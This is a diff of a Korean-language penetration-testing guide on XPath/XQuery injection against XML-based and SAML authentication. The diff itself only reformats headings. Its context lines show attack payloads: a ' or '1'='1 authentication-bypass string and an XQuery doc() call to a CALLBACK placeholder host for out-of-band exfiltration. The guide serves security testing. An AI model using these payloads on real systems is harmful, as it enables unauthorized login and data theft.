@@ -1,6 +1,4 @@
-### Phase 2: 동적 테스트 (검증)
-
-**기본 페이로드:**
+### 기본 페이로드
 
 **인증 우회** (`AUTH_BYPASS` 라벨):
 - `' or '1'='1` (username/password)
@@ -74,7 +72,7 @@ let $x := doc('http://CALLBACK/x') return $x
 
 ---
 
-**우회 페이로드:**
+### 우회 페이로드
 
 | 방어 | 페이로드 |
 |---|---|
@@ -95,7 +93,7 @@ let $x := doc('http://CALLBACK/x') return $x
 
 ---
 
-**참고사항:**
+### 참고사항
 
 - XML 기반 인증 시스템 (legacy)에서 가장 흔한 패턴
 - SAML assertion 처리 코드에서 XPath 자주 사용 — saml-scanner와 결합
